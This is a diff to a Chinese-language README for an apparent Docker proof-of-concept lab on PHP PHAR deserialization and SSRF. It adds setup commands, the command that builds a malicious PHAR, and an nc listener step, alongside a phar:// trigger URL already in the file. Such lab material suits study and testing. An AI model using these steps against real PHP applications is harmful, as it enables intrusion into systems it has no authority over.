@@ -35,6 +35,16 @@ class PDFGenerator {
 ---
 
 ## 3. 攻擊流程
+### 3.0 環境架設
+1. 安裝 docker (略)
+
+2. clone 下這一個 repo
+
+3. `docker build -t poc_phar_ssrf . ; docker run -p 8080:80 poc_phar_ssrf`
+（ 請確認 8080 port 是否被佔用，若被佔用請改其他 port ）
+
+4. 開啟 http://127.0.0.1:8080
+
 ### 3.1 建立 PHAR 文件
 
 ```php
@@ -57,6 +67,9 @@ $phar->addFromString("dummy.txt", "dummy");
 $phar->setMetadata($evil);
 $phar->stopBuffering();
 ```
+指令：
+`php -d phar.readonly=0 evil_phar_gen.php`
+php 中，phar 預設是readonly的
 
 
 ## 3.2 觸發反序列化
@@ -71,6 +84,9 @@ echo file_get_contents($file);
 `http://example.com/index.php?file=phar:///var/www/html/uploads/evil.phar/dummy.txt`
 
 訪問時會自動反序列化 PHAR metadata，觸發 `__destruct()`。
+
+請事先開啟 `nc` 監聽對應 port
+`nc -lv 443` ( mac，不確定其他操作系統)
 
 ---
 ## 4. Docker 測試注意點
